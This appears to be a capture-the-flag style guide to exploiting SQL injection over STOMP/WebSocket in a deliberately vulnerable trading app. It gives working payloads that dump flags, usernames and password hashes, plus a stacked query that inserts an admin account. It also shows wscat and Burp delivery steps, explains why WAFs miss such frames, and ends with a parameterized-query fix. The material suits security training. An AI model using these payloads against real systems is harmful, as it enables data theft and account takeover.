# WebSocket SQL Injection Attack Guide

## Overview

Traditional SQL injection targets HTTP endpoints, but this application has **SQL injection vulnerabilities exposed over STOMP/WebSocket**. This is a less common and often overlooked attack surface because:

- Web Application Firewalls (WAFs) typically don't inspect WebSocket frames
- Automated scanners (sqlmap, Burp) have limited WebSocket support
- Developers often forget to sanitize WebSocket message payloads

---

## Architecture

```
Browser (STOMP client)
    |
    |  WebSocket frame (ws://host:8085/ws)
    |  STOMP SEND destination: /app/trade.getHistory
    |  body: { "startDate": "...", "endDate": "...", "symbol": "..." }
    |
    v
Spring Boot STOMP Controller
    |
    |  @MessageMapping("/trade.getHistory")
    |  Extracts fields from payload
    |
    v
CustomQueryRepository.getTradeHistory()
    |
    |  String concatenation into raw SQL:
    |  "... WHERE o.user_id = " + userId
    |  " AND t.executed_at >= '" + startDate + "'"
    |  " AND t.symbol = '" + symbol + "'"
    |
    v
PostgreSQL (native query execution)
```

The response is sent back to `/user/queue/history` (or `/user/queue/errors` on exception).

---

## Vulnerable Parameters

All three date/symbol fields are concatenated directly into SQL:

| Parameter   | Injection Point                                      | Type           |
|-------------|------------------------------------------------------|----------------|
| `startDate` | `AND t.executed_at >= '${startDate}'`                | String in quotes |
| `endDate`   | `AND t.executed_at <= '${endDate}'`                  | String in quotes |
| `symbol`    | `AND t.symbol = '${symbol}'`                         | String in quotes |

Since all three are wrapped in single quotes, you need to **break out of the string** with `'` first.

---

## Attack Techniques

### 1. Basic UNION-based extraction

The base query returns 5 columns: `t.id, t.symbol, t.quantity, t.price, t.executed_at`

To use UNION injection, you need to match 5 columns. In the **Symbol** field:

```
' UNION SELECT 1, flag_value, 3, 4, now() FROM flags --
```

This produces:
```sql
... AND t.symbol = '' UNION SELECT 1, flag_value, 3, 4, now() FROM flags --'
```

### 2. Extract table names

```
' UNION SELECT 1, table_name::text, 3, 4, now() FROM information_schema.tables WHERE table_schema='public' --
```

### 3. Extract column names from a table

```
' UNION SELECT 1, column_name::text, 3, 4, now() FROM information_schema.columns WHERE table_name='users' --
```

### 4. Dump user credentials

```
' UNION SELECT id, username, 0, 0, now() FROM users --
```

```
' UNION SELECT id, password_hash, 0, 0, now() FROM users --
```

### 5. Extract flags table

```
' UNION SELECT id, flag_name || ':' || flag_value, 0, 0, now() FROM flags --
```

### 6. Using the Date fields

The date fields work the same way. In the **Start Date** field:

```
2020-01-01' UNION SELECT 1, flag_value, 3, 4, now() FROM flags --
```

### 7. Boolean-based blind (when UNION doesn't return visible output)

```
' AND 1=(SELECT CASE WHEN (SELECT count(*) FROM flags)>0 THEN 1 ELSE 0 END) --
```

### 8. Time-based blind

```
' AND 1=1; SELECT pg_sleep(5) --
```

If the response takes 5 seconds longer, the injection works.

### 9. Stacked queries (PostgreSQL supports this)

```
'; INSERT INTO users (username, password_hash, email, role, balance) VALUES ('hacker', '$2a$10$...', 'h@h.com', 'ADMIN', 999999) --
```

---

## Using the UI (Developer Mode)

1. Login as `dev / dev123` (DEVELOPER role enables debug hints)
2. Go to **History** page
3. In the **Symbol** field, enter the injection payload
4. Click **Load via WebSocket** (or "Load History" in clean mode)
5. Results appear in the trades table
6. Error messages from failed injections appear as toast notifications (they leak DB structure)

---

## Using Browser DevTools

You can also inject directly via the browser console:

```javascript
// Access the STOMP client
// Open DevTools > Console on the History page

// The WebSocket connection is managed by the app's websocketService
// You can send arbitrary STOMP messages:

// Method 1: Use the app's sendMessage function (if exposed)
// In React DevTools, find the websocketService module

// Method 2: Intercept via Burp Suite (see below)
```

---

## Using Burp Suite

1. Configure browser to proxy through Burp
2. Navigate to the History page and click "Load via WebSocket"
3. In Burp > Proxy > WebSocket history, find the SEND frame to `/app/trade.getHistory`
4. Right-click > Send to Repeater
5. Modify the JSON body fields with SQLi payloads
6. Send and observe the response frames

**Tip:** Burp's WebSocket message editor lets you replay modified STOMP frames without the UI.

---

## Using wscat / websocat (CLI)

```bash
# Connect with wscat
wscat -c ws://localhost:8085/ws

# Send STOMP CONNECT frame
CONNECT
Authorization:Bearer <your-jwt-token>
accept-version:1.2

^@

# Subscribe to response queue
SUBSCRIBE
id:sub-0
destination:/user/queue/history

^@

# Subscribe to error queue
SUBSCRIBE
id:sub-1
destination:/user/queue/errors

^@

# Send the injection payload
SEND
destination:/app/trade.getHistory
content-type:application/json

{"startDate":"2020-01-01","endDate":"2030-12-31","symbol":"' UNION SELECT 1, flag_value, 3, 4, now() FROM flags --"}
^@
```

Note: `^@` is the NULL character (Ctrl+@) that terminates STOMP frames.

---

## Why WAFs Miss This

1. **Protocol layer**: WAFs inspect HTTP request/response. WebSocket frames are a different protocol layer after the initial HTTP upgrade handshake.
2. **Binary framing**: WebSocket messages use binary framing, not HTTP-style text. Many WAFs don't decode STOMP-over-WebSocket.
3. **Bidirectional**: WAFs are designed for request-response. WebSocket is bidirectional and persistent.
4. **No URL path**: SQL payloads are inside JSON bodies within STOMP frames - there's no URL path or query string to match rules against.

---

## Mitigation (for reference)

The proper fix would be to use **parameterized queries**:

```java
// VULNERABLE (current code):
sql += " AND t.symbol = '" + symbol + "'";

// FIXED:
sql += " AND t.symbol = :symbol";
query.setParameter("symbol", symbol);
```

But since this is an intentionally vulnerable app, the SQLi remains exploitable.
